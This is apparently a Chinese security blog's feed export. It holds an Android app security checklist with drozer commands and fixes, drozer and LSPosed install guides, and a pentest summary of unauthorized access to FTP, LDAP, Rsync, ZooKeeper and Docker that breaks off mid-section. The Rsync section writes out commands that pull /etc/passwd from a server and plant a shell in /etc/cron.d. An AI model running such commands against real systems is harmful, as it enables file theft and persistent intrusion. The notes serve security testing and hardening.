href="htpps://jenchoi.tk/how-to-obtain-app-package-name">获取APP包名的方法</a>）</p><p>3、运行 <code>run app.activity.info –a  包名</code></p><img src="/img/image-20230701150922596.png" alt="image-20230701150922596" style="zoom:45%;" /><p>4、直接调用对应组件，看看是否能绕过app本身逻辑直接请求组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component 包名 组件名</span><br></pre></td></tr></table></figure><blockquote><p>组件名就是上面com.xxx.xxx.xxx.xxxActivity</p></blockquote><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将该组件的exported的属性为“false”。如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验。app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false</p><p>2、谨慎处理接收的intent以及其携带的信息，当Activity返回数据时候需注意目标Activity是否有泄露信息的风险</p><h2 id="Service组件暴漏"><a href="#Service组件暴漏" class="headerlink" title="Service组件暴漏"></a>Service组件暴漏</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Service是Android中四大组件进行后台作业的主要组件，如果被测应用对权限控制不当，导致其他应用可以启动被测应用的Service。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>方法一：drozer 执行 <code>run app.service.info -a &lt;packageName&gt;</code></p><p>方法二：直接检查AndroidManifest.xml 文件中的Services是否暴露</p><p><strong>整改意见：</strong></p><p>1、设置Service的android:exported 属性为 false</p><p>2、通过设置自定义权限来限制对Service的访问</p><h2 id="本地拒绝服务漏洞"><a href="#本地拒绝服务漏洞" class="headerlink" title="本地拒绝服务漏洞"></a>本地拒绝服务漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>android系统提供了activity、service和broadcastreceiver等组件，并提供了intent机制来协助应用间的交互与通讯，intent负责对应用中一次操作的动作动作涉及数据、附加数据进行描述，android系统则根据此intent的描述，负责找到对应的组件，将intent传递给调用的组件，并完成组件的调用。android应用本地拒绝服务漏洞源于程序没有对intent.getxxxextra0获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用导致其崩溃。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、将不必要的组件设置为不导出，即在 AndroidMenifest.xml 中将相应组件的android:exported属性设为false</p><p>2、建议处理通过 intent.getxxxextra() 获取的数据时进行以下判断，以及用try catch方式进行捕获所有异常，以防止应用出现拒绝服务漏洞</p><pre><code> 1) 空指针异常 2) 类型转换异常 3) 数组越界访问异常 4) 类未定义异常 5) 其他异常</code></pre><h2 id="Broadcast组件拒绝服务"><a href="#Broadcast组件拒绝服务" class="headerlink" title="Broadcast组件拒绝服务"></a>Broadcast组件拒绝服务</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果用户输入合并到可动态执行的代码中，那么攻击者可以提交构造的输入，破坏原有的数据，指定服务器执行构造的命令</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml 文件的各 Receiver 标签中，设置android:exported&#x3D;”false”</p><p>2、Receiver 代码中增加消息异常处理机制。</p><h2 id="ContentProvider组件信息泄露"><a href="#ContentProvider组件信息泄露" class="headerlink" title="ContentProvider组件信息泄露"></a>ContentProvider组件信息泄露</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以利用开放的Content Provider 获取系统敏感资源</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml文件的各Provider标签中，设置android;exported&#x3D;”false”</p><p>2、内部app通过ContentProvider交换数据，设置 protectionLevel&#x3D; “signature” 来验证签名</p><p>3、公开的 ContentProvider 确保不存储敏感数据</p><h2 id="ContentProvider组件SQL注入"><a href="#ContentProvider组件SQL注入" class="headerlink" title="ContentProvider组件SQL注入"></a>ContentProvider组件SQL注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>暴露的Provider组件，如果在 query() 中使用<strong>拼接</strong>字符串组成sql语句的形式去查询数据库，容易发生sql注入攻击。</p><p><strong>检查工具：</strong>无</p><p><strong>检查方法：</strong></p><p>1、AndroidManifest.xml 中查找Provider是否对外暴露（exported属性为true）</p><p>2、是否使用 query() 方法</p><p>3、SQL语句赋值来源是否为拼接字符串</p><p><strong>整改意见：</strong></p><p>1、不必要导出的Provider组件，建议显示设置组件的 android:exported 属性为 false</p><p>2、使用selectionArgs进行参数化查询</p><h2 id="content-provider目录遍历检测"><a href="#content-provider目录遍历检测" class="headerlink" title="content provider目录遍历检测"></a>content provider目录遍历检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>开发者为方便应用程序之间共享文件，会把实现了 openfile() 接口的content provider设置为导出状态，因此其他有相应调用该content provider权限的应用即可调用content provider的 openfile() 接口进行文件数据访问。但是如果没有进行content provider访问权限控制和对访问的目标文件的uri进行有效判断，攻击者利用文件目录遍历可访问任意可读文件，更有甚者可以往手机设备可写目录中写入任意数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将androidmanifest.xml 配置文件中设置该组件为exported的属性为 “false”</p><p>2、如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验</p><p>3、如果需要导出的话，严格编写过滤</p><h2 id="WebView域控制不严格漏洞"><a href="#WebView域控制不严格漏洞" class="headerlink" title="WebView域控制不严格漏洞"></a>WebView域控制不严格漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>当B应用的activity是可被导出的，同时设置允许WebView使用File协议，则A应用可以在外部调起B的Activity，同时向B传递一个请求内部数据的文件则可以获取B的数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、设置activity不可被导出</p><p>2、明确禁止WebView 使用 File 协议</p><h1 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h1><h2 id="代码未混滑"><a href="#代码未混滑" class="headerlink" title="代码未混滑"></a>代码未混滑</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆，。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、dex2jar将classes.dex转成jar包</p><p>2、使用jd-gui打开jar包，查看代码是否混淆</p><blockquote><p> 代码混淆过后，在语意上难以通过直接查看代码理解</p></blockquote><p><strong>整改意见：</strong>对APP安装包进行加固，执行强混淆操作</p><h2 id="代码未加固"><a href="#代码未加固" class="headerlink" title="代码未加固"></a>代码未加固</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆和加固，使攻击者很轻易反编译出源代码，从而对应用程序逻辑进行分析。</p><p><strong>检查工具：</strong>MT管理器</p><p><strong>检查方法：</strong></p><p>使用MT管理器查看被测apk文件加固状态</p><img src="/img/image-20230701164937608.png" alt="image-20230701164937608" style="zoom:50%;" /><p><strong>整改意见：</strong>对app加商业壳</p><h2 id="二次编译打包"><a href="#二次编译打包" class="headerlink" title="二次编译打包"></a>二次编译打包</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过反编译后得到程序源代码，修改源码后，重新编译、签名并安装。在重新打包的过程中，攻击者可能注入恶意代码，或者修改软件逻辑绕过鉴权等。</p><p><strong>检查工具：</strong>APKTool、jarsigner、zipalign（可选）</p><p><strong>检查方法：</strong></p><p>1、使用APKToole对apk进行反编译</p><p>2、修改代码后，再次使用APKTool对apk进行打包</p><p><code>apktool b 文件夹 -o 新apk名.apk</code></p><p><strong>整改意见：</strong>内部代码实现apk二次打包鉴别机制，在程序运行时校验apk签名是否由官方私钥签名而来。</p><h2 id="Janus安卓签名漏洞"><a href="#Janus安卓签名漏洞" class="headerlink" title="Janus安卓签名漏洞"></a>Janus安卓签名漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以绕过安卓系统的signature scheme V1签名机制，进而直接对app进行篡改</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>app使用signature scheme V2及以上版本签名机制</p><h2 id="Root环境检测"><a href="#Root环境检测" class="headerlink" title="Root环境检测"></a>Root环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>在mobile 应用启用certificate pinning 的情况下使用Rooted 手机+xposed+justtrustme 组件依然可以通过API hook进行中间人攻击。 监控客户端与后台的通信内容。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、应用启动时检测手机环境，确保为非root环境</p><p>2、检测如xposed、 Cydia Substrate、frida等逆向工具是否运行时，弹窗提醒用户设备已root</p><h2 id="模拟器环境检测"><a href="#模拟器环境检测" class="headerlink" title="模拟器环境检测"></a>模拟器环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以用模拟器运行、多开、调试、攻击程序</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>在客户端代码中增加模拟器检测</p><h2 id="证书绑定"><a href="#证书绑定" class="headerlink" title="证书绑定"></a>证书绑定</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过替换证书解密客户端与服务端之间的数据</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端应对服务端证书进行强验证</p><h2 id="代理环境检测"><a href="#代理环境检测" class="headerlink" title="代理环境检测"></a>代理环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过设置代理的方式，抓取客户端与服务器之间的数据包</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端存在代理时停止通络通信，并提醒用户关闭代理</p><h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h2 id="敏感信息硬编码"><a href="#敏感信息硬编码" class="headerlink" title="敏感信息硬编码"></a>敏感信息硬编码</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果类似密钥等敏感信息硬编码在源文件中，那么攻击者通过反编译程序代码，可以轻易获取这些敏感信</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>避免类似密钥，激活码等敏感信息直接硬编码在客户端源文件中。</p><h2 id="弱加密问题"><a href="#弱加密问题" class="headerlink" title="弱加密问题"></a>弱加密问题</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>使用弱加密算法会大大增加黑客攻击的概率，黑客可能会破解隐私数据、猜解密钥、中间人攻击等，造成隐私信息的泄漏，甚至造成财产损失</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、使用对称加密算法时避免使用DES算法，可以选择3DES</p><p>2、IvParameterSpec初始化时，不使用常量vector</p><p>3、使用 RSA 算法加密时，指定Padding模式，建议密钥长度&gt;1024 bit</p><h2 id="客户端敏感信息明文存储"><a href="#客户端敏感信息明文存储" class="headerlink" title="客户端敏感信息明文存储"></a>客户端敏感信息明文存储</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>敏感数据存储时应采取密文的形式，否则攻击者一旦获取数据，则直接获取明文的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>重要的敏感信息数据要通过加密方式存储，以避免被恶意截获</p><h2 id="日志中记录了泄露敏感信息"><a href="#日志中记录了泄露敏感信息" class="headerlink" title="日志中记录了泄露敏感信息"></a>日志中记录了泄露敏感信息</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端日志文件中或者动态的调试日志中输出了敏感的系统信息，攻击者可能会窃取到这些敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>日志文件中或者动态的调试日志中不应包含敏感信息</p><h2 id="本地数据库注入"><a href="#本地数据库注入" class="headerlink" title="本地数据库注入"></a>本地数据库注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端程序在查询本地的Content Provider时通过构造特殊的查询语句，进而查询额外的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>过滤引起SQLite查询语句歧义的特殊字符，例如单引号、双引号、圆括号、分号 等</p><h2 id="WebView-密码明文存储漏洞"><a href="#WebView-密码明文存储漏洞" class="headerlink" title="WebView 密码明文存储漏洞"></a>WebView 密码明文存储漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>WebView 默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时会弹出提示框，询问用户是否保存密码，如果选择”是”，密码会被明文保存到 &#x2F;data&#x2F;data&#x2F;com.package.name&#x2F;databases&#x2F;webview.db 中，这样就有被资取密码的危险。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>通过设置 WebSettings.setSavePassword(false) 关闭密码保存提醒功能</p><h1 id="业务逻辑安全"><a href="#业务逻辑安全" class="headerlink" title="业务逻辑安全"></a>业务逻辑安全</h1><h2 id="客户端更新安全性"><a href="#客户端更新安全性" class="headerlink" title="客户端更新安全性"></a>客户端更新安全性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者拦截替换客户端更新url，导致恶意程序被下载安装</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>对返回数据进行加密</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>drozer安装教程（windows）</title>
      <link href="/install-drozer-on-windows/"/>
      <url>/install-drozer-on-windows/</url>
      
        <content type="html"><![CDATA[<p>drozer这玩意真的是难装啊，之前第一次弄的时候装了两个下午，网上的教程写的乱七八糟的，每次要翻好多篇文章，所以干脆借此次给新电脑装drozer的机会，记录整理一下安装过程，以供后续参考。</p><h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><p>请自行安装以下环境，并配置好环境变量，安装pip包。这里比较简单，就不做赘述了</p><ul><li><p>python 2.7</p></li><li><p>pip2 install protobuf pyOpenSSL Twisted service_identity</p></li><li><p>jdk 1.6 官方推荐的，使用其他版本可能会有问题</p></li><li><p>adb</p></li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><h2 id="下载drozer"><a href="#下载drozer" class="headerlink" title="下载drozer"></a>下载drozer</h2><p>下载链接：<a href="https://github.com/mwrlabs/drozer/releases/">https://github.com/mwrlabs/drozer/releases/</a></p><p>选择系统相应的包，我这里选windows的msi安装包</p><h2 id="安装drozer"><a href="#安装drozer" class="headerlink" title="安装drozer"></a>安装drozer</h2><ol><li>双击安装</li><li>默认install for all user</li><li>Python from another location，下方输入python2.7的安装路径</li></ol><p><img src="/img/image-20230630233756387.png" alt="image-20230630233756387"></p><ol start="4"><li>完成安装</li></ol><h2 id="运行drozer"><a href="#运行drozer" class="headerlink" title="运行drozer"></a>运行drozer</h2><p>cmd中输入 <code>drozer -h</code> </p><p>如果出现drozer的帮助文档，那drozer这边就没问题了</p><blockquote><p>如果出现以下报错，则是python版本问题</p><p><strong>SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(“usage: drozer [COMMAND]”)?</strong></p><p>我把python2.7的命令变成了python2，此时需要编辑drozer.bat，把里面的python改成自己配置的python2就好</p></blockquote><h2 id="安装drozer-agent"><a href="#安装drozer-agent" class="headerlink" title="安装drozer agent"></a>安装drozer agent</h2><p>drozer agent 下载链接：<a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</a></p><p>下载好之后，安装到手机里</p><h2 id="drozer连接手机"><a href="#drozer连接手机" class="headerlink" title="drozer连接手机"></a>drozer连接手机</h2><p>1、打开app，开启drozer agent（右侧显示开启）</p><p>Embedded Server下面的端口，等会会用到</p><p><img src="/img/image-20230701000918341.png" alt="image-20230701000918341"></p><p>2、cmd中输入 <code>adb forward tcp:31415 tcp:31415</code></p><p>这里的31415就是上面drozer agent的端口</p><p>3、cmd中输入 <code>drozer console connect</code></p><p><img src="/img/image-20230701001213155.png" alt="image-20230701001213155"></p><p>出现这个，恭喜你，可以愉快的使用drozer了~</p><p><strong>参考资料</strong></p><ol><li><a href="https://www.cnblogs.com/lsdb/p/9441813.html">drozer安装使用教程（Windows） - 诸子流 - 博客园</a></li><li><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri-drozer-user-guide-2015-03-23.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高版本安卓XPosed框架安装指南</title>
      <link href="/install-xposed-for-android/"/>
      <url>/install-xposed-for-android/</url>
      
        <content type="html"><![CDATA[<p>XPosed框架是一款可以在不修改APK的情况下影响程序运行（修改系统）的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。 </p><p>目前Xposed框架已停止更新，它支持Android 6.0-8.1，但它针对android 8.0和8.1的仅为Beta版本。</p><p>如果想要在高版本安卓系统下使用XPosed，可以考虑以下两种方案：</p><ol><li>Edxposed</li><li>LSPosed（推荐！！！）</li></ol><p>Lsposed 是 Edxposed 的一个新的分支，Lsposed 与Edxposed 相互兼容，却比 Edxposed 更加简洁、易用和高效，是现如今饱受诟病的 Edxposed 的极佳替代品。</p><p>本文主要介绍LSPosed的安装方式</p><h1 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h1><ul><li>安卓版本：8～11</li><li>Magisk v21+、Magisk Manager</li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>1、下载 <a href="https://github.com/LSPosed/LSPosed/releases/latest">LSPosed模块</a></p><p>Riru版需要安装Riru，Zygisk版可以直接在Magisk中打开Zygisk</p><p>这里我下的Zygisk版</p><p>2、打开Zygisk</p><p>Magisk – 右上角【设置】 –  打开Zygisk</p><p><img src="/img/image-20230630130046825.png" alt="image-20230630130046825"></p><p>3、安装LSPosed模块</p><p>Magisk – 模块 – 从本地安装</p><p>选择第一步下载的LSPosed模块，等待安装完成之后，模块下面就会多出一个</p><p><img src="/img/image-20230630130422037.png" alt="image-20230630130422037"></p><p>4、安装LSPosed</p><p>前面第一步下载的那玩意是Magisk里面的LSPosed模块，现在是一个app</p><p>直接在应用商店下就行，我是在Play Store直接下的，没有的话就去网上找找资源</p><p><img src="/img/image-20230630130637206.png" alt="image-20230630130637206"></p><p>5、激活LSPosed</p><p>打开LSPosed app，会显示已经激活</p><p>要是没激活，试试重启大法！</p><p><img src="/img/image-20230630130756179.png" alt="image-20230630130756179"></p><p><strong>参考</strong></p><p><a href="https://magiskcn.com/lsposed-install">LSPosed 安装教程（LSP框架安装教程） - Magisk中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【总结】未授权访问</title>
      <link href="/unauthorized-access-summary/"/>
      <url>/unauthorized-access-summary/</url>
      
        <content type="html"><![CDATA[<p>此博客总结了未授权访问，方便自己进行渗透测试</p><ol><li>此博客总结的大多未授权，都是端口，或者某项应用，不包括一些特有的未授权访问</li><li>漏洞发现的方法：端口扫描、目录探测</li></ol><h1 id="21-FTP-未授权访问"><a href="#21-FTP-未授权访问" class="headerlink" title="[21] FTP 未授权访问"></a>[21] FTP 未授权访问</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>风险等级： 高危</p><p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p><p>影响版本：全版本</p><ul><li><p>匿名访问:</p></li><li><ul><li>用户名:anonymous   密码:空或guest或任意邮箱</li><li>用户名:FTP  密码:空或FTP</li></ul></li><li><p>未授权访问:</p></li><li><ul><li>不需要用户名密码可直接访问,一般出现在局域网中</li></ul></li></ul><p>漏洞详情</p><p>FTP是文件传输协议（File Transfer Protocol）的缩写，是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输的， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p><p>FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而，用户并不需要真正登陆到自己想要存取的计算机上面而成为完全用户，可用FTP程序访问远程资源，实现用户往返传输文件、目录管理以及访问电子邮件等等，即使双方计算机可能配有不同的操作系统和文件存储方式。</p><p>如果目标开启了匿名FTP服务，匿名FTP允许任意用户通过FTP来访问开放的目录和文件来进行信息收集进行下一步的攻击。使用匿名访问FTP服务可以尝试在Kali中nc：xxx.xxx.xxx.xxx，使用 anonymous和空密码认证。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、扫描端口</p><p>对端口进行扫描，扫到21端口开放，就可能存在未授权访问</p><p>2、浏览器直接访问<code>ftp://ip:port/</code></p><p>存在未授权访问的，就直接能看到文件了</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁止匿名登录</li><li>配置强密码。密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；</li></ul><h1 id="389-LDAP-未授权访问"><a href="#389-LDAP-未授权访问" class="headerlink" title="[389] LDAP 未授权访问"></a>[389] LDAP 未授权访问</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p><h2 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser工具（下载：<a href="https://ldapbrowserwindows.com/%EF%BC%89%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E3%80%82">https://ldapbrowserwindows.com/）直接连接，获取目录内容。</a></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改ldap的acl，禁止匿名访问</li><li>根据业务设置ldap访问白名单或黑名单</li></ul><h1 id="873-Rsync-未授权访问"><a href="#873-Rsync-未授权访问" class="headerlink" title="[873] Rsync 未授权访问"></a>[873] Rsync 未授权访问</h1><h2 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>rsync是Linux&#x2F;Unix下的一个远程数据同步工具，可通过LAN&#x2F;WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><h2 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、root@kali使用<code>Rsync</code>命令进行检测</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/</span><br><span class="line">rsync rsync://192.168.126.130:873/src</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载任意文件</span></span><br><span class="line">rsync rsync://192.168.126.130:873/srcetc/passwd ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入任意文件</span></span><br><span class="line">rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>隐藏掉 module 信息：修改配置文件 list &#x3D;false。</li><li>权限控制：不需要写入权限的 module 的设置为只读 Read only &#x3D; true;</li><li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问;</li><li>账户认证：只允许指定的用户利用指定的密码使用 rsync 服务;</li><li>数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh;</li></ul><h1 id="2181-ZooKeeper-未授权访问"><a href="#2181-ZooKeeper-未授权访问" class="headerlink" title="[2181] ZooKeeper 未授权访问"></a>[2181] ZooKeeper 未授权访问</h1><h2 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p><p>zookeeper有三个端口（可以修改）</p><ul><li>2181：对cline端提供服务</li><li>2888：集群内机器通讯使用（Leader监听此端口）</li><li>3888：选举leader使用</li></ul><h2 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描，扫到2181端口</p><p>2、直接连接 或 获取服务器环境信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接连接</span></span><br><span class="line">./zkCli.sh -server ip:port</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取服务器环境信息</span></span><br><span class="line">echo envi | nc ip 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span></span><br><span class="line">echo stat | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ruok：测试服务器是否运行在非错误状态。</span></span><br><span class="line">echo ruok | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">reqs：列出未完成的请求。</span></span><br><span class="line">echo reqs | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">envi：打印有关服务环境的详细信息。</span></span><br><span class="line">echo envi | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump：列出未完成的会话和临时节点。</span></span><br><span class="line">echo dump | ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>为ZooKeeper配置相应的访问权限</li><li>设置防火墙策略</li><li>禁止把Zookeeper直接暴露在公网</li></ul><h1 id="2375-Docker-未授权访问"><a href="#2375-Docker-未授权访问" class="headerlink" title="[2375] Docker 未授权访问"></a>[2375] Docker 未授权访问</h1><h2 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Docker Remote API未授权访问：在使用docker swarm的时候，管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，其实这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps的效果一样，其他操作比如创建&#x2F;删除container，拉取image等操作也都可以通过API调用完成。</p><p>Docker daemon api是使用url代替命令行来操作docker，docker swarm 